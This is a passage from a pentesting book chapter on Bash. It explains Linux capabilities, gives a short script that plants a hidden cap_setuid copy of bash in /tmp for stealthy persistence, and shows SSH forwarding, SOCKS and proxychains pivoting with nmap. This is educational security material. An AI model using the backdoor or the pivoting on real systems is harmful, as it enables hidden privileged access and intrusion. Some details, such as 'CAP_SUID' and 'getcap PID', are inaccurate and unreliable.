        : This allows us to bind to privileged
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.498.1">
         ports (&lt;
        </span>
       </span>
       <span class="No-Break">
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.499.1">
          1024
         </span>
        </strong>
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.500.1">
         ).
        </span>
       </span>
      </li>
      <li>
       <strong class="bold">
        <span class="koboSpan" id="kobo.501.1">
         CAP_CHOWN
        </span>
       </strong>
       <span class="koboSpan" id="kobo.502.1">
        : This allows us to change
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.503.1">
         file ownership.
        </span>
       </span>
      </li>
      <li>
       <strong class="bold">
        <span class="koboSpan" id="kobo.504.1">
         CAP_DAC_OVERRIDE
        </span>
       </strong>
       <span class="koboSpan" id="kobo.505.1">
        : This allows us to bypass file read, write, and execute
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.506.1">
         permission checks.
        </span>
       </span>
      </li>
     </ul>
    </li>
    <li>
     <span class="koboSpan" id="kobo.507.1">
      Capabilities can be viewed with
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.508.1">
       getcap
      </span>
     </strong>
     <span class="koboSpan" id="kobo.509.1">
      and set on executable files
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.510.1">
       using
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.511.1">
        setcap
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.512.1">
       .
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.513.1">
     Here’s an example of how to view the capabilities of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.514.1">
      a process:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.515.1">
$ getcap /path/to/executable</span></pre>
   <p>
    <span class="koboSpan" id="kobo.516.1">
     Here’s an example of how to set the capabilities of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.517.1">
      an executable:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.518.1">
$ sudo setcap cap_setuid=+ep /path/to/executable</span></pre>
   <p>
    <span class="koboSpan" id="kobo.519.1">
     This command grants the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.520.1">
      CAP_SUID
     </span>
    </strong>
    <span class="koboSpan" id="kobo.521.1">
     capability to the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.522.1">
      specified executable.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.523.1">
     To view the capabilities of a running process, run the following command, replacing
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.524.1">
      PID
     </span>
    </strong>
    <span class="koboSpan" id="kobo.525.1">
     with the process ID you want
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.526.1">
      to check:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.527.1">
$ getcap PID</span></pre>
   <p>
    <span class="koboSpan" id="kobo.528.1">
     The capability’s
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.529.1">
      =eip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.530.1">
     suffix
    </span>
    <a id="_idIndexMarker766">
    </a>
    <span class="koboSpan" id="kobo.531.1">
     provides a way to precisely control which capabilities are available to processes and how they can be used or passed on to child processes.
    </span>
    <span class="koboSpan" id="kobo.531.2">
     This granular control allows system administrators to implement the principle of least privilege, granting only the specific capabilities required for a process to function, rather than giving it full
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.532.1">
      root privileges.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.533.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.534.1">
      =eip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.535.1">
     suffix refers to the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.536.1">
      effective
     </span>
    </em>
    <span class="koboSpan" id="kobo.537.1">
     ,
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.538.1">
      inheritable
     </span>
    </em>
    <span class="koboSpan" id="kobo.539.1">
     , and
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.540.1">
      permitted
     </span>
    </em>
    <span class="koboSpan" id="kobo.541.1">
     set of capabilities.
    </span>
    <span class="koboSpan" id="kobo.541.2">
     This suffix is used when setting or viewing capabilities on files or processes in Linux systems that support fine-grained
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.542.1">
      privilege control.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.543.1">
     To understand
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.544.1">
      =eip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.545.1">
     , let’s break
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.546.1">
      it down:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.547.1">
       e
      </span>
     </strong>
     <span class="koboSpan" id="kobo.548.1">
      –
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.549.1">
       effective
      </span>
     </em>
     <span class="koboSpan" id="kobo.550.1">
      : These are the capabilities currently in use by
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.551.1">
       the process.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.552.1">
       i
      </span>
     </strong>
     <span class="koboSpan" id="kobo.553.1">
      –
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.554.1">
       inheritable
      </span>
     </em>
     <span class="koboSpan" id="kobo.555.1">
      : These capabilities can be inherited by
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.556.1">
       child processes.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.557.1">
       p
      </span>
     </strong>
     <span class="koboSpan" id="kobo.558.1">
      –
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.559.1">
       permitted
      </span>
     </em>
     <span class="koboSpan" id="kobo.560.1">
      : These are the capabilities that the process is allowed
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.561.1">
       to use.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.562.1">
     When you see a capability with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.563.1">
      =eip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.564.1">
     suffix, it means that the capability has been set for all three sets: effective, inheritable,
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.565.1">
      and permitted.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.566.1">
     For example, if you were to set the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.567.1">
      CAP_SETUID
     </span>
    </strong>
    <span class="koboSpan" id="kobo.568.1">
     capability on a file with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.569.1">
      =eip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.570.1">
     , you could use a command
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.571.1">
      like this:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.572.1">
$ sudo setcap cap_setuid=eip /path/to/file</span></pre>
   <p>
    <span class="koboSpan" id="kobo.573.1">
     This command sets the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.574.1">
      CAP_SETUID
     </span>
    </strong>
    <span class="koboSpan" id="kobo.575.1">
     capability as effective, inheritable, and permitted for the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.576.1">
      specified file.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.577.1">
     Here’s an example of
    </span>
    <a id="_idIndexMarker767">
    </a>
    <span class="koboSpan" id="kobo.578.1">
     using Linux capabilities to maintain persistent access post-exploitation stealthily.
    </span>
    <span class="koboSpan" id="kobo.578.2">
     This script demonstrates how to maintain access using Linux capabilities.
    </span>
    <span class="koboSpan" id="kobo.578.3">
     You can find it in this chapter’s GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.579.1">
      as
     </span>
     <a id="_idTextAnchor414">
     </a>
     <a id="_idTextAnchor415">
     </a>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.580.1">
       ch12_capabilities.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.581.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.582.1">
#!/usr/bin/env bash
# Create a hidden directory
mkdir /tmp/.persist
# Copy /bin/bash to the hidden directory
cp /bin/bash /tmp/.persist/shell
# Set the CAP_SETUID capability on the copied shell
setcap cap_setuid+ep /tmp/.persist/shell</span></pre>
   <p>
    <span class="koboSpan" id="kobo.583.1">
     Let’s take a closer look at
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.584.1">
      this code:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.585.1">
      First, it creates a hidden directory
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.586.1">
       in
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.587.1">
        /tmp
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.588.1">
       .
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.589.1">
      The script copies the Bash shell to this
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.590.1">
       hidden location.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.591.1">
      Then, it uses the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.592.1">
       setcap
      </span>
     </strong>
     <span class="koboSpan" id="kobo.593.1">
      command to add the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.594.1">
       CAP_SETUID
      </span>
     </strong>
     <span class="koboSpan" id="kobo.595.1">
      capability to the copied shell.
     </span>
     <span class="koboSpan" id="kobo.595.2">
      This capability allows the shell to set the user ID, effectively giving it
     </span>
     <a id="_idTextAnchor416">
     </a>
     <a id="_idTextAnchor417">
     </a>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.596.1">
       root-like privileges.
      </span>
     </span>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.597.1">
     Directories such as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.598.1">
      /tmp
     </span>
    </strong>
    <span class="koboSpan" id="kobo.599.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.600.1">
      /dev/shm
     </span>
    </strong>
    <span class="koboSpan" id="kobo.601.1">
     may be cleared on restart, so be sure to check whether they’re mounted as a filesystem of the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.602.1">
      tmpfs
     </span>
    </strong>
    <span class="koboSpan" id="kobo.603.1">
     type before saving any files for persistence.
    </span>
    <span class="koboSpan" id="kobo.603.2">
     If they’re mounted as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.604.1">
      tmpfs
     </span>
    </strong>
    <span class="koboSpan" id="kobo.605.1">
     , then you need to choose a different location; otherwise, your persistence mechanism will be lost on restart.
    </span>
    <span class="koboSpan" id="kobo.605.2">
     You can check this by entering the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.606.1">
      mount
     </span>
    </strong>
    <span class="koboSpan" id="kobo.607.1">
     command and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.608.1">
      grep
     </span>
    </strong>
    <span class="koboSpan" id="kobo.609.1">
     for the directory location – for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.610.1">
      example,
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.611.1">
       /tmp
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.612.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.613.1">
     This technique is difficult to detect through standard system monitoring.
    </span>
    <span class="koboSpan" id="kobo.613.2">
     It doesn’t modify core system files or create new user accounts.
    </span>
    <span class="koboSpan" id="kobo.613.3">
     However, it provides a way to regain
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.614.1">
      elevated privileges.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.615.1">
     Understanding and
    </span>
    <a id="_idIndexMarker768">
    </a>
    <span class="koboSpan" id="kobo.616.1">
     using Linux capabilities provides a more stealthy way to regain privileged access for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.617.1">
      post-exploitation operations.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.618.1">
     In the next section, we’ll explore methods that are used to pivot through compromised Linux Bash environments to gain access to networks that would otherwise be beyond
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.619.1">
      our reach.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-197">
    <a id="_idTextAnchor418">
    </a>
    <span class="koboSpan" id="kobo.620.1">
     The basics of network pivoting with Bash
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.621.1">
     In the field of pentesting, it’s
    </span>
    <a id="_idIndexMarker769">
    </a>
    <span class="koboSpan" id="kobo.622.1">
     quite usual to utilize a breached system as a stepping-stone
    </span>
    <a id="_idIndexMarker770">
    </a>
    <span class="koboSpan" id="kobo.623.1">
     for exploring and accessing additional networks linked to that system.
    </span>
    <span class="koboSpan" id="kobo.623.2">
     This section will explore the methodology that’s used to pivot through a compromised Linux
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.624.1">
      Bash environment.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.625.1">
     SSH port forwarding
    </span>
    <a id="_idIndexMarker771">
    </a>
    <span class="koboSpan" id="kobo.626.1">
     is a simple yet effective method for pivoting.
    </span>
    <span class="koboSpan" id="kobo.626.2">
     It allows you to tunnel traffic through an SSH connection, enabling access to otherwise unreachable systems.
    </span>
    <span class="koboSpan" id="kobo.626.3">
     In this section, we’ll cover two types of SSH port forwarding: local
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.627.1">
      and remote.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.628.1">
     Local port forwarding
    </span>
    <a id="_idIndexMarker772">
    </a>
    <span class="koboSpan" id="kobo.629.1">
     lets you forward a port from your local machine to a remote server through an SSH connection.
    </span>
    <span class="koboSpan" id="kobo.629.2">
     The following command is an example of local
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.630.1">
      port forwarding:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.631.1">
$ ssh -L 8080:internal_server:80 user@pivot_host</span></pre>
   <p>
    <span class="koboSpan" id="kobo.632.1">
     This command establishes an SSH connection to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.633.1">
      pivot_host
     </span>
    </strong>
    <span class="koboSpan" id="kobo.634.1">
     and forwards local port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.635.1">
      8080
     </span>
    </strong>
    <span class="koboSpan" id="kobo.636.1">
     to port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.637.1">
      80
     </span>
    </strong>
    <span class="koboSpan" id="kobo.638.1">
     on
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.639.1">
      internal_server
     </span>
    </strong>
    <span class="koboSpan" id="kobo.640.1">
     through the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.641.1">
      pivot_host
     </span>
    </strong>
    <span class="koboSpan" id="kobo.642.1">
     .
    </span>
    <span class="koboSpan" id="kobo.642.2">
     After executing this command, accessing
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.643.1">
      localhost:8080
     </span>
    </strong>
    <span class="koboSpan" id="kobo.644.1">
     on your local machine will reach port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.645.1">
      80
     </span>
    </strong>
    <span class="koboSpan" id="kobo.646.1">
     on
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.647.1">
      internal_server
     </span>
    </strong>
    <span class="koboSpan" id="kobo.648.1">
     .
    </span>
    <span class="koboSpan" id="kobo.648.2">
     Local port forwarding is best used when you need to reach a single server port on an internal network through a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.649.1">
      compromised system.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.650.1">
     Remote port forwarding
    </span>
    <a id="_idIndexMarker773">
    </a>
    <span class="koboSpan" id="kobo.651.1">
     is the reverse of local port forwarding.
    </span>
    <span class="koboSpan" id="kobo.651.2">
     It allows you to forward a port from the remote SSH server to your local machine.
    </span>
    <span class="koboSpan" id="kobo.651.3">
     The following command exemplifies starting a remote port forward
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.652.1">
      with SSH:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.653.1">
$ ssh -R 8080:localhost:80 user@pivot_host</span></pre>
   <p>
    <span class="koboSpan" id="kobo.654.1">
     This command forwards port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.655.1">
      8080
     </span>
    </strong>
    <span class="koboSpan" id="kobo.656.1">
     on
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.657.1">
      pivot_host
     </span>
    </strong>
    <span class="koboSpan" id="kobo.658.1">
     to port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.659.1">
      80
     </span>
    </strong>
    <span class="koboSpan" id="kobo.660.1">
     on your local machine.
    </span>
    <span class="koboSpan" id="kobo.660.2">
     So, anyone accessing port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.661.1">
      8080
     </span>
    </strong>
    <span class="koboSpan" id="kobo.662.1">
     on
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.663.1">
      pivot_host
     </span>
    </strong>
    <span class="koboSpan" id="kobo.664.1">
     will reach port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.665.1">
      80
     </span>
    </strong>
    <span class="koboSpan" id="kobo.666.1">
     on your local machine.
    </span>
    <span class="koboSpan" id="kobo.666.2">
     Remote port forwarding is best used when you need to exfiltrate data out of an internal network, such as when you need to receive a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.667.1">
      reverse shell.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.668.1">
     SSH forward port forwarding
    </span>
    <a id="_idIndexMarker774">
    </a>
    <span class="koboSpan" id="kobo.669.1">
     can be inflexible because they are one-to-one port mappings.
    </span>
    <span class="koboSpan" id="kobo.669.2">
     A
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.670.1">
      Socket Secure
     </span>
    </strong>
    <span class="koboSpan" id="kobo.671.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.672.1">
      SOCKS
     </span>
    </strong>
    <span class="koboSpan" id="kobo.673.1">
     ) proxy
    </span>
    <a id="_idIndexMarker775">
    </a>
    <span class="koboSpan" id="kobo.674.1">
     is a general-purpose proxy that routes network traffic between a client and a server via a proxy server.
    </span>
    <span class="koboSpan" id="kobo.674.2">
     Setting up a SOCKS proxy with SSH allows for more flexible pivoting as it can handle various types
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.675.1">
      of traffic.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.676.1">
     The following SSH
    </span>
    <a id="_idIndexMarker776">
    </a>
    <span class="koboSpan" id="kobo.677.1">
     command
    </span>
    <a id="_idIndexMarker777">
    </a>
    <span class="koboSpan" id="kobo.678.1">
     initiates a dynamic
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.679.1">
      SOCKS proxy:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.680.1">
$ ssh -D 9050 user@pivot_host</span></pre>
   <p>
    <span class="koboSpan" id="kobo.681.1">
     This command establishes an SSH connection to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.682.1">
      pivot_host
     </span>
    </strong>
    <span class="koboSpan" id="kobo.683.1">
     and creates a SOCKS proxy on local port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.684.1">
      9050
     </span>
    </strong>
    <span class="koboSpan" id="kobo.685.1">
     .
    </span>
    <span class="koboSpan" id="kobo.685.2">
     You can then configure your applications (for example, web browser) to use this SOCKS proxy.
    </span>
    <span class="koboSpan" id="kobo.685.3">
     For example, you can use this proxy
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.686.1">
      with
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.687.1">
       curl
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.688.1">
      :
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.689.1">
$ curl --socks5 localhost:9050 http://internal_server</span></pre>
   <p>
    <span class="koboSpan" id="kobo.690.1">
     This command sends an HTTP request to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.691.1">
      internal_server
     </span>
    </strong>
    <span class="koboSpan" id="kobo.692.1">
     through the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.693.1">
      SOCKS proxy.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.694.1">
     You can also use the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.695.1">
      proxychains
     </span>
    </strong>
    <span class="koboSpan" id="kobo.696.1">
     tool
    </span>
    <a id="_idIndexMarker778">
    </a>
    <span class="koboSpan" id="kobo.697.1">
     in combination with a SOCKS proxy.
    </span>
    <span class="koboSpan" id="kobo.697.2">
     This is most helpful when you need to use tools that aren’t proxy-aware with a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.698.1">
      SOCKS proxy.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.699.1">
     We need to configure proxychains before we can use it.
    </span>
    <span class="koboSpan" id="kobo.699.2">
     The configuration file is typically located at
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.700.1">
      /etc/proxychains4.conf
     </span>
    </strong>
    <span class="koboSpan" id="kobo.701.1">
     .
    </span>
    <span class="koboSpan" id="kobo.701.2">
     Edit this file and change the last line from
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.702.1">
      socks4 127.0.0.1 9050
     </span>
    </strong>
    <span class="koboSpan" id="kobo.703.1">
     to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.704.1">
      socks5
     </span>
    </strong>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.705.1">
      127.0.0.1 9050
     </span>
    </strong>
    <span class="koboSpan" id="kobo.706.1">
     .
    </span>
    <span class="koboSpan" id="kobo.706.2">
     Note that there’s a tab character between
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.707.1">
      socks5
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.708.1">
      and
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.709.1">
       127.0.0.1
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.710.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.711.1">
     Now that we have proxychains set up, let’s use it on Kali with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.712.1">
      nmap
     </span>
    </strong>
    <span class="koboSpan" id="kobo.713.1">
     to perform a TCP port scan.
    </span>
    <span class="koboSpan" id="kobo.713.2">
     Here’s the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.714.1">
      basic syntax:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.715.1">
$ proxychains -q nmap -sT -p- [target_ip]</span></pre>
   <p>
    <span class="koboSpan" id="kobo.716.1">
     Let’s take a closer look at
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.717.1">
      this command:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.718.1">
       proxychains -q
      </span>
     </strong>
     <span class="koboSpan" id="kobo.719.1">
      : This tells the system to use proxychains for the following command.
     </span>
     <span class="koboSpan" id="kobo.719.2">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.720.1">
       -q
      </span>
     </strong>
     <span class="koboSpan" id="kobo.721.1">
      option makes
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.722.1">
       proxychains quiet.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.723.1">
       nmap
      </span>
     </strong>
     <span class="koboSpan" id="kobo.724.1">
      : The network mapping tool
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.725.1">
       we’re using.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.726.1">
       -sT
      </span>
     </strong>
     <span class="koboSpan" id="kobo.727.1">
      : This flag tells
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.728.1">
       nmap
      </span>
     </strong>
     <span class="koboSpan" id="kobo.729.1">
      to perform a TCP connect scan.
     </span>
     <span class="koboSpan" id="kobo.729.2">
      You can’t perform a TCP SYN or UDP scan through a SOCKS proxy.
     </span>
     <span class="koboSpan" id="kobo.729.3">
      The scan must be a TCP
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.730.1">
       connect scan.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.731.1">
       -p-
      </span>
     </strong>
     <span class="koboSpan" id="kobo.732.1">
      : This flag tells
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.733.1">
       nmap
      </span>
     </strong>
     <span class="koboSpan" id="kobo.734.1">
      to scan all
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.735.1">
       ports (
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.736.1">
        1
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.737.1">
       -
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.738.1">
        65535
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.739.1">
       ).
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.740.1">
       [target_ip]
      </span>
     </strong>
     <span class="koboSpan" id="kobo.741.1">
      : Replace this with the IP address you want
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.742.1">
       to scan.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.743.1">
     In this case, our current target
    </span>
    <a id="_idIndexMarker779">
    </a>
    <span class="koboSpan" id="kobo.744.1">
     doesn’t have SSH exposed.
    </span>
    <span class="koboSpan" id="kobo.744.2">
     You’ll learn how to pivot when SSH isn’t available in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.745.1">
      next section.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.746.1">
     Be aware that scanning through
    </span>
    <a id="_idIndexMarker780">
    </a>
    <span class="koboSpan" id="kobo.747.1">
     a SOCKS proxy is very slow.
    </span>
    <span class="koboSpan" id="kobo.747.2">
     You may want to restrict your scans to a limited number of ports.
    </span>
    <span class="koboSpan" id="kobo.747.3">
     An alternative is to transfer a tool such as Goscan to the pivot host and scan from there.
    </span>
    <span class="koboSpan" id="kobo.747.4">
     You can find Goscan
    </span>
    <a id="_idIndexMarker781">
    </a>
    <span class="koboSpan" id="kobo.748.1">
     at
    </span>
    <a href="https://github.com/sdcampbell/goscan">
     <span class="koboSpan" id="kobo.749.1">
      https://github.com/sdcampbell/goscan
     </span>
    </a>
    <span class="koboSpan" id="kobo.750.1">
     .
    </span>
    <span class="koboSpan" id="kobo.750.2">
     ProjectDiscovery Naabu is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.751.1">
      another option.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.752.1">
     These basic pivoting techniques provide a foundation for accessing restricted network segments during pentesting.
    </span>
    <span class="koboSpan" id="kobo.752.2">
     They allow you to extend your reach within a target environment, facilitating further exploration and testing of internal systems.
    </span>
    <span class="koboSpan" id="kobo.752.3">
     We’ll explore more advanced pivot
    </span>
    <a id="_idTextAnchor419">
    </a>
    <a id="_idTextAnchor420">
    </a>
    <span class="koboSpan" id="kobo.753.1">
     ing techniques in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.754.1">
      next section.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-198">
    <a id="_idTextAnchor421">
    </a>
    <span class="koboSpan" id="kobo.755.1">
     Mastering advanced pivoting and lateral movement
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.756.1">
     In this section, we’ll explore advanced pivoting and lateral movement techniques using Bash scripting.
    </span>
    <span class="koboSpan" id="kobo.756.2">
     These methods go beyond basic SSH tunneling and SOCKS proxies, focusing on more sophisticated approaches to navigate complex
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.757.1">
      network environments.
     </span>
    </span>
   </p>
